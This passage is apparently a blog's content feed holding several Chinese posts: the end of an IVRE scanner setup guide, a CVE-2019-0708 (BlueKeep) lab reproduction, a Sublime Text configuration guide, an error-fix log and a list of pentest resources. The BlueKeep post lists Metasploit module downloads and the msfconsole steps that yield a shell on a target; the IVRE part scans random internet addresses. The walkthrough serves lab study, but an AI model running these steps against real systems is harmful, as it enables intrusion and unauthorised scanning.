importation</h1><p>这一步时间有点长，耐心等待</p><pre><code>$ yes | ivre ipinfo --init$ yes | ivre scancli --init$ yes | ivre view --init$ yes | ivre flowcli --init$ yes | sudo ivre runscansagentdb --init$ sudo ivre ipdata --download --import-all</code></pre><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190921203152.png" alt></p><h1 id="0x04-Run-a-first-scan"><a href="#0x04-Run-a-first-scan" class="headerlink" title="0x04 Run a first scan"></a>0x04 Run a first scan</h1><h2 id="Against-1k-routable-IP-addresses-with-a-single-nmap-process"><a href="#Against-1k-routable-IP-addresses-with-a-single-nmap-process" class="headerlink" title="Against 1k (routable) IP addresses, with a single nmap process:"></a>Against 1k (routable) IP addresses, with a single nmap process:</h2><p><code>sudo ivre runscans --routable --limit 200</code></p><p>如果报如下错误：</p><pre><code>nmap: unrecognized option &#39;--script-timeout&#39;ADDING TARGET 1 : 120.75.39.145ERROR: NMAP PROCESS IS DEAD</code></pre><p>或者</p><pre><code>Traceback (most recent call last):  File &quot;/usr/local/bin/ivre&quot;, line 84, in &lt;module&gt;    main()  File &quot;/usr/local/bin/ivre&quot;, line 56, in main    tools.get_command(next(iter(possible_commands)))()  File &quot;/usr/local/lib/python2.7/dist-packages/ivre/tools/runscans.py&quot;, line 498, in main    accept_target_status=accept_target_status)  File &quot;/usr/local/lib/python2.7/dist-packages/ivre/tools/runscans.py&quot;, line 217, in call_nmap    stdin=subprocess.PIPE, stdout=subprocess.PIPE)  File &quot;/usr/lib/python2.7/subprocess.py&quot;, line 711, in __init__    errread, errwrite)  File &quot;/usr/lib/python2.7/subprocess.py&quot;, line 1343, in _execute_child    raise child_exceptionOSError: [Errno 2] No such file or directory</code></pre><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190920111226.png" alt></p><p>因为 nmap未安装或者版本过低，Nmap Debian 版本可能比当前的版本晚一年甚至更长的时间<br>下载最新 RPM 格式的 nmap 包，然后使用 alien 工具把他转换成 debian 包，再用 dpkg 工具安装即可。</p><p>步骤如下：</p><ul><li>先卸载已安装的nmap<br><code>sudo apt remove nmap -y</code></li><li>安装 alien<br><code>sudo apt-get install alien</code></li><li>使用wget下载  <a href="https://nmap.org/download.html" target="_blank" rel="noopener">Nmap RPMs</a><br><code>wget https://nmap.org/dist/nmap-7.80-1.x86_64.rpm</code></li><li>转化<br><code>sudo alien nmap-7.80-1.x86_64.rpm</code></li><li>安装<br><code>sudo dpkg --install nmap_7.80-2_amd64.deb</code></li></ul><h2 id="import-the-results-and-create-a-view"><a href="#import-the-results-and-create-a-view" class="headerlink" title="import the results and create a view"></a>import the results and create a view</h2><pre><code>$ ivre scan2db -c ROUTABLE,ROUTABLE-CAMPAIGN-001 -s MySource -r \&gt;              scans/ROUTABLE/up$ ivre db2view nmap</code></pre><p>返回Web UI，刷新即可查看扫描结果。</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190921213155.png" alt></p><h2 id="WEB-UI-没有数据"><a href="#WEB-UI-没有数据" class="headerlink" title="WEB-UI 没有数据"></a>WEB-UI 没有数据</h2><p>安装好后，数据导入了数据库，web-ui界面一直显示Conuting，没有数据</p><p><code>cat /var/log/apache2/error.log</code></p><p>查看apache错误日志，发现<br>使用的是Python3 安装的，但是它会调用Python2，所以报错<br>解决办法是</p><p>直接卸载python2，<br>或者<br>使用python2来安装IVRE。</p><p>如果还不出来，再查看apache错误日志，根据报错来改，可能缺少模块。</p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://mstajbakhsh.ir/ivre-drunk-frenchman-port-scanner-framework/" target="_blank" rel="noopener">IVRE! Drunk Frenchman Port Scanner Framework!</a><br><a href="https://doc.ivre.rocks/en/latest/overview/index.html" target="_blank" rel="noopener">Overview — IVRE documentation</a></p>]]></content>
      
      
      <categories>
          
          <category> 威胁情报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tools </tag>
            
            <tag> Ubuntu16 </tag>
            
            <tag> 源码 </tag>
            
            <tag> IVRE </tag>
            
            <tag> 网络侦查框架 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2019-0708远程桌面代码执行漏洞复现</title>
      <link href="/2019/09/07/cve-2019-0708-yuan-cheng-zhuo-mian-dai-ma-zhi-xing-lou-dong-fu-xian/"/>
      <url>/2019/09/07/cve-2019-0708-yuan-cheng-zhuo-mian-dai-ma-zhi-xing-lou-dong-fu-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01 漏洞概述"></a>0x01 漏洞概述</h1><p>Windows系列服务器于2019年5月15号，被爆出高危漏洞，该漏洞影响范围较广如：windows2003、windows2008、windows2008 R2、windows xp系统都会遭到攻击，该服务器漏洞利用方式是通过远程桌面端口3389，RDP协议进行攻击的。CVE-2019-0708漏洞是通过检查用户的身份认证，导致可以绕过认证，不用任何的交互，直接通过rdp协议进行连接发送恶意代码执行命令到服务器中去。如果被攻击者利用，会导致服务器入侵，中病毒，像WannaCry 永恒之蓝漏洞一样大规模的感染。</p><p>2019年9月7日晚上凌晨1点左右，metaspolit更新了漏洞利用程序。</p><h1 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02 影响版本"></a>0x02 影响版本</h1><p>该漏洞影响旧版本的Windows系统，包括：<br>Windows 7、Windows Server 2008 R2、Windows Server 2008、Windows 2003、Windows XP</p><p>Windows 8和Windows 10及之后版本不受此漏洞影响。</p><h1 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="靶机"><a href="#靶机" class="headerlink" title="靶机"></a>靶机</h3><p>本地使用<code>VMware Workstation Pro 15</code> 安装 <code>win7_x64 SP1</code><br>并设置 允许任何人远程桌面连接<br>附上 Windows7 SP1下载链接</p><p><code>ed2k://|file|cn_windows_7_ultimate_with_sp1_x64_dvd_u_677408.iso|3420557312|B58548681854236C7939003B583A8078|/</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190908214611.png" alt></p><h3 id="攻击机KALI"><a href="#攻击机KALI" class="headerlink" title="攻击机KALI"></a>攻击机KALI</h3><p>替换所需要的文件<br>Kali在Terminal下执行如下命令进行替换：</p><pre><code>wget https://raw.githubusercontent.com/rapid7/metasploit-framework/edb7e20221e2088497d1f61132db3a56f81b8ce9/lib/msf/core/exploit/rdp.rbwget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/rdp_scanner.rbwget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rbwget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rbcp rdp.rb /usr/share/metasploit-framework/lib/msf/core/exploit/cp rdp_scanner.rb /usr/share/metasploit-framework/modules/auxiliary/scanner/cp cve_2019_0708_bluekeep_rce.rb /usr/share/metasploit-framework/modules/exploits/windows/rdp/cp cve_2019_0708_bluekeep.rb /usr/share/metasploit-framework/modules/auxiliary/scanner/rdp/</code></pre><p>msf升级到5</p><p><code>apt install metasploit-framework</code></p><p>进入msf,并重新加载利用模块</p><p><code>msfconsole</code><br><code>reload_all</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190908215218.png" alt></p><p>使用 <strong>0708RDP</strong> 攻击模块,并设置参数</p><pre><code>use exploit/windows/rdp/cve_2019_0708_bluekeep_rceset RHOSTS 192.168.134.133set target 3exploit</code></pre><p>target是主机架构选择的意思，一定要选对，<br>vm装的win7sp1话，先试2，再试3，本文使用1也测试成功,建议试一次重启靶机一次。<br>选错架构会导致蓝屏、利用失败等问题</p><p>如果报如下错误:</p><pre><code>Exploit failed: NameError undefined local variable or method `rdp_connect&#39; for #&lt;Msf::Modules::Exploit__Rdp__Cve_2019_0708_bluekeep_rce::MetasploitModule:0x00007fd83f439260&gt;Did you mean?  disconnect[*] Exploit completed, but no session was created.</code></pre><p>一般是<code>rdp.rb</code>没替换或者放错位置了,重新替换即可</p><p>建立连接以后,使用<code>shell</code>获得shell<br>再使用<code>python</code>获得交互式shell</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190908220553.png" alt></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190908220636.png" alt></p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://qiita.com/shimizukawasaki/items/024b296a4c9ae7c33961" target="_blank" rel="noopener">CVE-2019-0708远程桌面代码执行漏洞复现 - Qiita</a><br><a href="https://www.cnblogs.com/backlion/p/11482322.html?from=timeline" target="_blank" rel="noopener">Windows RDP的RCE漏洞分析和复现（CVE-2019-0708）</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
            <tag> 复现 </tag>
            
            <tag> CVE-2019-0708 </tag>
            
            <tag> RDP </tag>
            
            <tag> 3389 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sublime Text3使用指南</title>
      <link href="/2019/08/31/sublime-text3-shi-yong-zhi-nan/"/>
      <url>/2019/08/31/sublime-text3-shi-yong-zhi-nan/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>sublime是一款轻便、快捷的编辑器，好处多多，<br>只不过配置起来麻烦了点，所有在此记录一下自用配置。<br>（本文默认环境为window 10）</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190831220729.png" alt></p><h1 id="0x02-下载"><a href="#0x02-下载" class="headerlink" title="0x02 下载"></a>0x02 下载</h1><p><a href="https://www.sublimetext.com/" target="_blank" rel="noopener">官网</a>直达,下载安装即可</p><h1 id="0x03-使用技巧"><a href="#0x03-使用技巧" class="headerlink" title="0x03 使用技巧"></a>0x03 使用技巧</h1><h2 id="启用VIM模式"><a href="#启用VIM模式" class="headerlink" title="启用VIM模式"></a>启用VIM模式</h2><p>在<code>Preferences -&gt; Setting - User</code>中将<br><code>ignored_packages</code> 的值注释掉</p><p>因为<code>Ctrl+f</code> <code>Ctrl+b</code>等vim快捷键和Sublime Text3冲突了，<br>所以在这个配置文件里添加一句</p><p><code>&quot;vintage_ctrl_keys&quot;: true</code></p><p>附上<a href="https://www.cnblogs.com/hezhiyao/p/7624831.html" target="_blank" rel="noopener">vim入门教程</a>一份</p><p>代码如下：</p><pre><code>    &quot;vintage_ctrl_keys&quot;: true,    &quot;ignored_packages&quot;:    [        //注释掉开启vim模式        // &quot;Vintage&quot;    ],</code></pre><h2 id="批量修改"><a href="#批量修改" class="headerlink" title="批量修改"></a>批量修改</h2><p>单个文件批量修改：纯相同的内容：选中需要修改的内容Alt+F3(Mac下默认的是Ctrl+Command+G) ，<br>或者连续 Ctrl+D（ 连续 Command+D(Mac) ) 之后重新写即可，使用Ctrl + U进行回退，使用Esc退出多重编辑。</p><h2 id="分屏操作"><a href="#分屏操作" class="headerlink" title="分屏操作"></a>分屏操作</h2><p>Windows下：<br>Alt + Shift + 2进行左右分屏，<br>Alt + Shift + 8进行上下分屏，<br>Alt + Shift + 5进行上下左右分屏（即分为四屏）。</p><h1 id="0x04-常用插件"><a href="#0x04-常用插件" class="headerlink" title="0x04 常用插件"></a>0x04 常用插件</h1><p>新版的sublime已经默认安装了package control，直接一手<code>ctrl+shift+p</code><br>输入框中输入<code>install</code>，点击列表中的<code>Package control:install package</code><br>稍等片刻，弹出列表，即可搜索插件安装。<br>（加载和安装的失败，多试几次，基本都是网络原因）</p><h2 id="主题插件-—-Material-Theme"><a href="#主题插件-—-Material-Theme" class="headerlink" title="主题插件 — Material Theme"></a>主题插件 — Material Theme</h2><p>搜索安装之后在<br><code>Preference -&gt; Settings -&gt; User</code> 里面复制如下配置：<br>也可以去<a href="https://github.com/equinusocio/material-theme" target="_blank" rel="noopener">Material Theme</a>的GitHub仓库查看主题配置说明，自己配置</p><pre><code>{    &quot;always_show_minimap_viewport&quot;: true,    &quot;bold_folder_labels&quot;: true,    &quot;color_scheme&quot;: &quot;Packages/Material Theme/schemes/Material-Theme.tmTheme&quot;,    &quot;fade_fold_buttons&quot;: false,    &quot;font_options&quot;:    [        &quot;gray_antialias&quot;    ],    &quot;font_size&quot;: 15,    &quot;ignored_packages&quot;:    [        &quot;Vintage&quot;    ],    &quot;indent_guide_options&quot;:    [        &quot;draw_normal&quot;,        &quot;draw_active&quot;    ],    &quot;line_padding_bottom&quot;: 3,    &quot;line_padding_top&quot;: 3,    &quot;material_theme_accent_scrollbars&quot;: true,    &quot;material_theme_arrow_folders&quot;: false,    &quot;material_theme_big_fileicons&quot;: true,    &quot;material_theme_bold_tab&quot;: true,    &quot;material_theme_bright_scrollbars&quot;: true,    &quot;material_theme_bullet_tree_indicator&quot;: true,    &quot;material_theme_compact_panel&quot;: true,    &quot;material_theme_compact_sidebar&quot;: true,    &quot;material_theme_contrast_mode&quot;: true,    &quot;material_theme_disable_folder_animation&quot;: false,    &quot;material_theme_disable_tree_indicator&quot;: true,    &quot;material_theme_panel_separator&quot;: true,    &quot;material_theme_small_statusbar&quot;: true,    &quot;material_theme_small_tab&quot;: true,    &quot;material_theme_tabs_autowidth&quot;: false,    &quot;material_theme_tabs_separator&quot;: false,    &quot;material_theme_tree_headings&quot;: true,    &quot;overlay_scroll_bars&quot;: &quot;enabled&quot;,    &quot;show_encoding&quot;: true,    &quot;show_line_endings&quot;: true,    &quot;theme&quot;: &quot;Material-Theme.sublime-theme&quot;}</code></pre><h2 id="透明插件-—-Transparency"><a href="#透明插件-—-Transparency" class="headerlink" title="透明插件 — Transparency"></a>透明插件 — Transparency</h2><p>仅支持windows系统，直接搜索<code>Transparency</code>在线安装即可实现透明<br>在<code>View -&gt; Windows&#39;s Transparency</code> 即可调整透明等级</p><h2 id="代码补全-—-Anaconda"><a href="#代码补全-—-Anaconda" class="headerlink" title="代码补全 — Anaconda"></a>代码补全 — Anaconda</h2><p>python代码补全</p><p><code>=&gt;Preferences=&gt;Package setting=&gt; Anaconda =&gt;Setting -User</code></p><pre><code>{    //Python路径    &quot;python_interpreter&quot;: &quot;C:/Users/AppData/Local/Programs/Python/Python36-32/python.exe&quot;,    //忽略各种空格不对, 超过79字, import的函数没有使用的提醒,    &quot;pep8_ignore&quot;: [&quot;E501&quot;, &quot;W292&quot;, &quot;E303&quot;, &quot;W391&quot;, &quot;E225&quot;, &quot;E302&quot;, &quot;W293&quot;, &quot;E402&quot;],    &quot;pyflakes_explicit_ignore&quot;:    [        &quot;UnusedImport&quot;    ],    //保存文件后自动pep8格式化    &quot;auto_formatting&quot;: true,    &quot;auto_formatting_timeout&quot;: 5,    //库函数的提示    &quot;enable_signatures_tooltip&quot;: true,    &quot;merge_signatures_and_doc&quot;:true,    //ST3也有自动补全提示，但只提示文件中输入过的单词，这个功能可用提示变量可用的函数等。    &quot;suppress_word_completions&quot;: true,    &quot;suppress_explicit_completions&quot;: true,    &quot;complete_parameters&quot;: true,    //代码排版时，行的默认长度太短，根据喜好设置    &quot;pep8_max_line_length&quot;: 120,}</code></pre><h2 id="调试插件-—-SublimeREPL"><a href="#调试插件-—-SublimeREPL" class="headerlink" title="调试插件 — SublimeREPL"></a>调试插件 — SublimeREPL</h2><p>安装好后，点击<code>Preferences -&gt; Browse Packages</code><br>找到<code>SublimeREPL\config\Python\Main.sublime-menu</code>文件，<br>然后用Sublime Text 3 打开，找到如图所示行，<br>修改为<code>&quot;cmd&quot;: [&quot;python&quot;, &quot;-i&quot;, &quot;-u&quot;,&quot;$file_basename&quot;]</code>，保存。<br>这样相当于将SublimeREPL的python交互环境的命令改为运行当前文件的交互环境。</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190901005107.png" alt></p><p>然后设置快捷键 <code>Preferences -&gt; Key Bindings</code><br>如下<code>shift+f10</code>运行  <code>shift+f9</code>调试，可以修改为自己喜欢的快捷键<br>配合分屏操作，体验极佳</p><pre><code>[    {    &quot;keys&quot;: [&quot;shift+f10&quot;],    &quot;caption&quot;: &quot;SublimeREPL: Python - RUN current file&quot;,    &quot;command&quot;: &quot;run_existing_window_command&quot;,    &quot;args&quot;: {        &quot;id&quot;: &quot;repl_python_run&quot;,        &quot;file&quot;: &quot;config/Python/Main.sublime-menu&quot;}    },    {    &quot;keys&quot;: [&quot;shift+f9&quot;],    &quot;caption&quot;: &quot;SublimeREPL: Python - PDB current file&quot;,    &quot;command&quot;: &quot;run_existing_window_command&quot;,    &quot;args&quot;: {        &quot;id&quot;: &quot;repl_python_pdb&quot;,        &quot;file&quot;: &quot;config/Python/Main.sublime-menu&quot;}    },]</code></pre><blockquote><p>如果使用快捷键运行Python文件如果出现如下报错：<br><code>[&#39;$file_basename&#39;: [Errno 2] No such file or directory]</code><br>原因是当你使用<code>shift+f10</code>执行了一次之后，焦点已经不再当前执行的<code>.py</code>文件上了<br>点击要执行的<code>.py</code>文件，再执行就ok</p></blockquote><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190901011958.png" alt></p><p><strong>pdb 常用命令</strong></p><table><thead><tr><th align="center">命令</th><th align="center">解释</th></tr></thead><tbody><tr><td align="center">break 或 b</td><td align="center">设置断点</td></tr><tr><td align="center">continue 或 c</td><td align="center">继续执行程序</td></tr><tr><td align="center">list 或 l</td><td align="center">查看当前行的代码段</td></tr><tr><td align="center">step 或 s</td><td align="center">进入函数</td></tr><tr><td align="center">return 或 r</td><td align="center">执行代码直到从当前函数返回</td></tr><tr><td align="center">exit 或 q</td><td align="center">中止并退出</td></tr><tr><td align="center">next 或 n</td><td align="center">执行下一行</td></tr><tr><td align="center">pp</td><td align="center">打印变量的值</td></tr><tr><td align="center">help</td><td align="center">帮助</td></tr></tbody></table><h2 id="注释插件-—-DocBlockr"><a href="#注释插件-—-DocBlockr" class="headerlink" title="注释插件 — DocBlockr"></a>注释插件 — DocBlockr</h2><p>这个插件可以自动生成函数类型、参数个数及类型、函数返回值等<br>在函数上方输入<code>/**</code>，回车即可</p><p>python可以安装<code>DocBlockr python</code><br>在函数里输入<code>&#39;&#39;&#39;</code>回车即可</p><h2 id="终端插件-—-Terminal"><a href="#终端插件-—-Terminal" class="headerlink" title="终端插件 — Terminal"></a>终端插件 — Terminal</h2><p>快捷键 <code>ctrl+shift+t</code> <code>ctrl+alt+shift+t</code><br>安装好后，修改如下配置文件<br><code>=&gt;Preferences=&gt;Package setting=&gt;Terminal=&gt;Setting -User</code></p><pre><code>{    &quot;terminal&quot;: &quot;C:\\windows\\system32\\cmd.exe&quot;,     &quot;parameters&quot;: [&quot;/START&quot;,&quot;%CWD%&quot;]}</code></pre><h2 id="右键菜单增强-—-SideBarEnhancements"><a href="#右键菜单增强-—-SideBarEnhancements" class="headerlink" title="右键菜单增强 — SideBarEnhancements"></a>右键菜单增强 — SideBarEnhancements</h2><p>增强右键菜单功能：<br>在资源管理器中打开、新建文件、新建文件夹、以…打开、在浏览器中打开等等<br>可以配置在浏览器中打开快捷键<br>这里设置按Ctrl+Shift+C复制文件路径，按F2即可在Chrome浏览器预览效果<br>(如果需要的话，也可以根据自己的需要为Firefox，Safari，IE，Opera等加上)，<br>当然你也可以自己定义喜欢的快捷键，最后注意代码中的浏览器路径要以自己电脑里的文件路径为准。</p><p><code>preferences-&gt;package setting-&gt;side bar-&gt;Key Building-User</code></p><pre><code>[    { &quot;keys&quot;: [&quot;ctrl+shift+c&quot;], &quot;command&quot;: &quot;copy_path&quot; },    //chrome    { &quot;keys&quot;: [&quot;f2&quot;], &quot;command&quot;: &quot;side_bar_files_open_with&quot;,            &quot;args&quot;: {                &quot;paths&quot;: [],                &quot;application&quot;: &quot;C:\\Users\\jeffj\\AppData\\Local\\Google\\Chrome\\Application\\chrome.exe&quot;,                &quot;extensions&quot;:&quot;.*&quot;            }     }]</code></pre><h2 id="新建文件模板-—-FileHeader"><a href="#新建文件模板-—-FileHeader" class="headerlink" title="新建文件模板 — FileHeader"></a>新建文件模板 — FileHeader</h2><p>功能强大，自动的监测创建新文件动作，自动根据类型  添加模板。<br>几乎支持所有的编程语言，并且支持用户自定义语言。<br>能够自动的更新文件最后修改时间。<br>能够自动的更新文件最后的修改者。<br>不仅支持创建已经使用模板初始化好的文件，而且支持将header添加到已经存在的文件头部，并且支持批量添加。</p><p>设置默认文件模板:</p><p><code>=&gt;Preferences=&gt;Package setting=&gt;FileHeader=&gt;Setting -User</code></p><pre><code>{    &quot;Default&quot;:{        &quot;email&quot;:&quot;xxxx@qq.com&quot;,        &quot;last_modified_by&quot;:&quot;小红&quot;,        &quot;author&quot;:&quot;小明&quot;    }}</code></pre><p>设置对应文件模板:</p><p><code>Preferences -&gt; Browse Packages</code></p><p>进入<code>FileHeader\template\header</code>目录，<br>找到你想要添加头文件的语言对应的<code>.tmpl</code>文件修改即可</p><h2 id="快速创建文件-—-advancedNewFile"><a href="#快速创建文件-—-advancedNewFile" class="headerlink" title="快速创建文件 — advancedNewFile"></a>快速创建文件 — advancedNewFile</h2><p>快捷键<code>ctrl+alt+n</code><br>在弹出的输入框里输入我们需要新建的文件名回车即可,<br>默认路径为当前文件夹下，如果当前没有目录则会存到用户家目录<br>也可以带路径输入<code>test/test.py</code><br>（如果不确定路径，可以在输入框下方小字查看完整路径）</p><hr><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://www.jianshu.com/p/3cb5c6f2421c/" target="_blank" rel="noopener">如何优雅地使用Sublime Text3 - 简书</a><br><a href="https://www.jianshu.com/p/73304373539f" target="_blank" rel="noopener">（干货）自定义使用Sublime Text 3 - 简书</a><br><a href="https://www.cnblogs.com/JackyXu2018/p/8821482.html" target="_blank" rel="noopener">SubLime Text 3 配置SublimeREPL来交互式调试程序</a><br><a href="https://www.cnblogs.com/zhaof/p/8126306.html" target="_blank" rel="noopener">让你用sublime写出最完美的python代码–windows环境</a><br><a href="https://blog.csdn.net/zxy987872674/article/details/81707241" target="_blank" rel="noopener">sublime text 3 打造python3环境（代码自动补全，运行程序，高亮显示）</a></p>]]></content>
      
      
      <categories>
          
          <category> tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Sublime Text3 </tag>
            
            <tag> 透明美化 </tag>
            
            <tag> python </tag>
            
            <tag> 插件 </tag>
            
            <tag> vim </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Error_Collect</title>
      <link href="/2019/08/31/error-collect/"/>
      <url>/2019/08/31/error-collect/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>记录一下遇到的坑爹的事，和一些问题的解决办法</p><h1 id="0x02-Windows"><a href="#0x02-Windows" class="headerlink" title="0x02 Windows"></a>0x02 Windows</h1><h2 id="VMware"><a href="#VMware" class="headerlink" title="VMware"></a>VMware</h2><h3 id="‘安装VMware-Tools’-按钮呈灰色"><a href="#‘安装VMware-Tools’-按钮呈灰色" class="headerlink" title="‘安装VMware Tools’ 按钮呈灰色"></a>‘安装VMware Tools’ 按钮呈灰色</h3><p>如图：<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190908205656.png" alt></p><p>解决办法：<br>关闭虚拟机，在虚拟机设置分别设置CD/DVD、CD/DVD2和软盘为自动检测，重启即可<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190908205835.png" alt></p><hr><h1 id="0x03-Linux"><a href="#0x03-Linux" class="headerlink" title="0x03 Linux"></a>0x03 Linux</h1><h2 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h2><h3 id="docker-compose"><a href="#docker-compose" class="headerlink" title="docker-compose"></a>docker-compose</h3><p>在Centos安装docker-compose时，出现了ImportError: ‘module’ object has no attribute ‘check_specifier，</p><p>通过参考<a href="https://github.com/pypa/pip/issues/4104" target="_blank" rel="noopener">https://github.com/pypa/pip/issues/4104</a></p><p>利用easy_install –version 查看了setuptools的版本，将其升级到30.1.0版本</p><p>pip install –upgrade setuptools==30.1.0</p><h2 id="dpkg报错"><a href="#dpkg报错" class="headerlink" title="dpkg报错"></a>dpkg报错</h2><pre><code>dpkg-deb: error: subprocess paste was killed by signal (Broken pipe)Errors were encountered while processing:</code></pre><p>使用命令<code>sudo autoremove -y</code> 即可</p><h2 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h2><h3 id="重启服务器后-Nginx-启动失败"><a href="#重启服务器后-Nginx-启动失败" class="headerlink" title="重启服务器后 Nginx 启动失败"></a>重启服务器后 Nginx 启动失败</h3><p>重启Ubuntu服务器后，使用命令<code>systemctl start nginx</code>提示：<br><code>Job for nginx.service failed because the control process exited with error code. See &quot;systemctl status nginx.service&quot; and &quot;journalctl -xe&quot; for details.</code></p><p>使用<code>nginx -s reload</code> 提示如下，<code>sites-enabled</code>文件夹下多了一些其他文件和文件夹，删除多余的即可<br><code>nginx: [crit] pread() &quot;/etc/nginx/sites-enabled/scans&quot; failed (21: Is a directory)</code></p><p>再次使用<code>nginx -s reload</code> 报错如下，这应该是因为重启把nginx进程杀死后pid丢失了<br><code>nginx: [error] open() &quot;/run/nginx.pid&quot; failed (2: No such file or directory</code></p><p>解决方法如下：<br><code>nginx -c /etc/nginx/nginx.conf （其中/etc/nginx/nginx.conf 是你的nginx.conf的文件路径）</code></p><p>最后使用<code>nginx -s reload</code>即可重新启动</p><h1 id="0x03-语言"><a href="#0x03-语言" class="headerlink" title="0x03 语言"></a>0x03 语言</h1><h2 id="python"><a href="#python" class="headerlink" title="python"></a>python</h2><h3 id="pip升级报错"><a href="#pip升级报错" class="headerlink" title="pip升级报错"></a>pip升级报错</h3><p>Ubuntu 16  pip3 升级之后 报错 如下：<br><code>from pip import main ImportError: cannot import name &#39;main&#39;</code></p><p>两种解决办法：</p><ol><li>使用命令  <code>python3 -m pip install 模块名</code> 来安装即可。</li><li>使用命令<code>sudo vim /usr/bin/pip3</code><br> 修改：<code>from pip import main</code> 为：<code>from pip._internal import main</code><br> 保存退出,再运行 pip3 install 模块名 就能成功了！</li></ol><hr><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://blog.csdn.net/qq_40259641/article/details/79022844?utm_source=blogxgwz4" target="_blank" rel="noopener">安装VMware Tools显示灰色正确解决办法</a></p>]]></content>
      
      
      <categories>
          
          <category> Error </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Error </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>资源工具</title>
      <link href="/2019/08/23/zi-yuan-gong-ju/"/>
      <url>/2019/08/23/zi-yuan-gong-ju/</url>
      
        <content type="html"><![CDATA[<p><strong>资源工具自用收集</strong></p><h1 id="0x01-资源整合"><a href="#0x01-资源整合" class="headerlink" title="0x01 资源整合"></a>0x01 资源整合</h1><h2 id="资源导航"><a href="#资源导航" class="headerlink" title="资源导航"></a>资源导航</h2><hr><p> nmask’s Blog   大佬博客 导航<br><a href="https://thief.one/SecWeb/" target="_blank" rel="noopener">https://thief.one/SecWeb/</a></p><p> 网络安全与渗透测试工具导航<br><a href="https://github.com/dylan903/SecBox/blob/master/README.md" target="_blank" rel="noopener">https://github.com/dylan903/SecBox/blob/master/README.md</a></p><p> 干货集中营-算命縖子<br><a href="http://www.nmd5.com/test/index.php" target="_blank" rel="noopener">http://www.nmd5.com/test/index.php</a></p><p> penetration渗透 超全面的渗透资料💯 包含：0day，xss，sql注入，提权……<br><a href="https://github.com/dylan903/penetration" target="_blank" rel="noopener">https://github.com/dylan903/penetration</a></p><p>Web-Security-Learning<br><a href="https://chybeta.github.io/2017/08/19/Web-Security-Learning/" target="_blank" rel="noopener">https://chybeta.github.io/2017/08/19/Web-Security-Learning/</a></p><p>Study Notes For Web Hacking / Web安全学习笔记<br><a href="https://github.com/dylan903/Learn-Web-Hacking" target="_blank" rel="noopener">https://github.com/dylan903/Learn-Web-Hacking</a></p><p>A collection of awesome penetration testing resources, tools and other shiny things<br><a href="https://github.com/dylan903/awesome-pentest" target="_blank" rel="noopener">https://github.com/dylan903/awesome-pentest</a></p><p>information security Tools Box （信息安全工具以及资源集合）<br><a href="https://github.com/dylan903/Sec-Box" target="_blank" rel="noopener">https://github.com/dylan903/Sec-Box</a></p><h2 id="文章收集"><a href="#文章收集" class="headerlink" title="文章收集"></a>文章收集</h2><hr><p>public-pentesting-reports<br>Curated list of public penetration test reports released by several consulting firms and academic security groups<br><a href="https://github.com/juliocesarfort/public-pentesting-reports" target="_blank" rel="noopener">https://github.com/juliocesarfort/public-pentesting-reports</a></p><p>Collection of quality safety articles<br><a href="https://github.com/dylan903/collection-document" target="_blank" rel="noopener">collection-document</a></p><p> Top 100 Hacking &amp; Security E-Books<br><a href="https://github.com/dylan903/Hacking-Security-Ebooks" target="_blank" rel="noopener">Hacking-Security-Ebooks</a></p><p>应急响应实战笔记，一个安全工程师的自我修养。<br><a href="https://github.com/dylan903/Emergency-Response-Notes" target="_blank" rel="noopener">Emergency-Response-Notes</a></p><p>Micro8 Online<br><a href="https://github.com/dylan903/Micro8-HTML" target="_blank" 